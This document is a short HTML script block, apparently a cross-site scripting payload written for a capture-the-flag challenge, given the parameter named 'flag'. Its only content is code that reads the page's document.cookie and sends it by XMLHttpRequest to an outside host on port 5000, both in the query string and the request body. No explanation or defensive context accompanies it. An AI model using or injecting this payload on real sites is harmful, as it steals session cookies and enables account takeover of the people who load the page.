<script>
var http = new XMLHttpRequest();
http.open("GET","http://jcunniff.net:5000?flag=" + document.cookie, false);
http.send(document.cookie);
</script>
